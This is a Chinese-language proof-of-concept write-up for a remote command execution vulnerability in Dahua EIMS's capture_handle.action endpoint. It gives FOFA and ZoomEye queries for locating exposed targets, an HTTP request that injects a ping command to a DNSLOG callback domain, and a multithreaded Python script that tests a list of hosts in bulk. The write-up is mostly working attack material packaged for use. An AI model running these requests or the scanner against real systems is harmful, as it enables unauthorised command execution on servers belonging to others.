**漏洞简介**

大华 EIMS-capture_handle.action接口存在远程命令执行漏洞，攻击者可利用该漏洞获取服务器控制权限。

**漏洞复现**

步骤一：使用以下搜索语法获取测试资产并确定测试目标

```
# 搜索语法fofa:"<title>eims</title>"钟馗之眼：app:"大华 EIMS"
```

步骤二：在DNSLOG平台获取一条子域名并使用以下数据包进行命令执行测试...

```
# DNSLOG平台pbugfg.dnslog.cn
```

```yaml
GET /config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20pbugfg.dnslog.cn%20index.pcap HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Host: 127.0.0.1
```

![图片](%E5%A4%A7%E5%8D%8E%20EIMS-capture_handle.action%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.assets/640.png)



步骤三：在DNSlog平台刷新记录可获取解析的数据...



```python
#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:LY
# from:https://github.com/MD-SEC/MDPOCS
# fofa: app="dahua-EIMS"
# Zoomeye: app:"大华 EIMS"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                      +')
    print(
        '+ EXP: python3 Dahua_EIMS_captureCommand_Rce.py url.txt                                                       +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8080'
} 
def poc(host):
    url = host
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Accept":"*/*",
        "Host":"%s" %host2
    }
    vulurl = url + "/config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping xxx.dnslog.cn index.pcap"
    try:
        r = requests.get(vulurl, headers=headers)
        if r.status_code==200 and "success" in r.text :
            #print(host)
            print( host2+":true ")
        else:
            return 0
            print (host+":false")
    except:
        pass
        #print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(poc, row[0])
```